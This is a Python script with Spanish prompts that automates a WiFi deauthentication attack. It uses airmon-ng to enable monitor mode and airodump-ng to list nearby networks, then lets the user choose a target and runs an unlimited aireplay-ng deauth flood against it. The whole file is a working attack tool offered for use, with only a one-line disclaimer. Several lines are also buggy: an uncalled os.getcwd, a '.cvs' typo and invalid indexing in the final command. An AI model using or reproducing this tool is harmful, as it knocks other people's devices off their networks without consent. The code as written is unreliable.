from os import system 
system ("clear")
#Disclaimer:
#Esto es un proyecto sin fines de afectar a nadie 
import subprocess
import re  
import csv 
import os 
import time 
import shutil 
from datetime import datetime 
redes_wif_activas = []
def buscar_la_essid (essid, lst): 
    revisar_estatus = True 
    
    if len(lst) == 0:
        return revisar_estatus 

    for item in lst:
        
        if essid in item["ESSID"]:
            revisar_estatus = False

    return revisar_estatus 
#Interfas 
print ("██████╗░███████╗███╗░░░███╗███████╗██████╗░░█████╗░░██████╗░██╗░░░░░░░██╗██╗░██████╗")
print ("██╔══██╗██╔════╝████╗░████║██╔════╝██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║██║██╔════╝")
print ("██║░░██║█████╗░░██╔████╔██║█████╗░░██║░░██║██║░░██║╚█████╗░░╚██╗████╗██╔╝██║╚█████╗░")
print ("██║░░██║██╔══╝░░██║╚██╔╝██║██╔══╝░░██║░░██║██║░░██║░╚═══██╗░░████╔═████║░██║░╚═══██╗")
print ("██████╔╝███████╗██║░╚═╝░██║███████╗██████╔╝╚█████╔╝██████╔╝░░╚██╔╝░╚██╔╝░██║██████╔╝")
print ("╚═════╝░╚══════╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░")
print ("████████████████████████████████████████████████████████████ ")
print ("██    Nesario una tarjeta de red externa                  ██")
print ("██    Hola soy yann525                                    ██")
print ("████████████████████████████████████████████████████████████")

if not 'SUDO_UID' in os.environ.keys():
    print("Intenta ejecutar este programa con sudo")
    exit()
    
for normbre_de_archivo in os.listdir ():
    if ".cvs" in normbre_de_archivo : 
        print ("No debería haber ningún archivo .csv en su directorio. Encontramos archivos .csv en su directorio y los moveremos al directorio de respaldo")
        directorio = os.getcwd
        try: 
            os.mkdir(directorio + "/backup")
        except :
            print("Backup ya existe")
        timestamp = datetime.now()
        shutil.move(normbre_de_archivo, directorio + "/backup/" + str(timestamp) + "-" + normbre_de_archivo)

partron_de_wlan = re.compile ("wlan[0-9]+")
revisar_wifi_resultado = partron_de_wlan.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
if len (revisar_wifi_resultado) == 0: 
    print ("Por favor conecte un adaptador wifi y intente de nuevo ")
    exit ()

print ("Las siguientes interfaces WiFi están disponibles: ")
for index, item in enumerate(revisar_wifi_resultado):
   print(f"{index} - {item}")

while True :
     opción_interfaz_wifi = input ("Seleccione la interfaz que desea utilizar para el ataque: ")
     try: 
         if opción_interfaz_wifi [int(opción_interfaz_wifi)]:
            break
     except:
        print("Ingrese un número que corresponda con las opciones disponibles")

hacknic = revisar_wifi_resultado[int(opción_interfaz_wifi)]
print ("¡Adaptador WiFi conectado!\nAhora eliminemos los procesos en conflicto:")

kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print ("Poner el adaptador Wifi en modo monitoreo:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try: 
    while True: 
        subprocess.call ("clear", shell=True)
        for normbre_de_archivo in os.listdir ():
             fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
             if ".csv" in normbre_de_archivo:
                 with open(normbre_de_archivo) as csv_h:
                     csv_h.seek(0)
                     csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                     for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif buscar_la_essid(row["ESSID"], redes_wif_activas):
                                redes_wif_activas.append(row) 
        print("Exploración. Presione Ctrl+C cuando desee seleccionar qué red inalámbrica desea atacar.\n")
        print("No █\tBSSID              █\tChannel█\tESSID                         █")
        print("___█\t___________________█\t_______█\t______________________________█")
        for index, item in enumerate(redes_wif_activas):
           
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
       
        time.sleep(1)
        
except KeyboardInterrupt:
    print("\nListo para elegir.")
    
while True:
   
    choice = input("Seleccione una opción de arriba: ")
    try:
         if redes_wif_activas[int(choice)]:
            break
    except:
        print("Inténtalo de nuevo.")

hackbssid = redes_wif_activas[int(choice)]["BSSID"]
hackchannel = redes_wif_activas[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, revisar_wifi_resultado[int(revisar_wifi_resultado)] + "mon"])

    
                                  
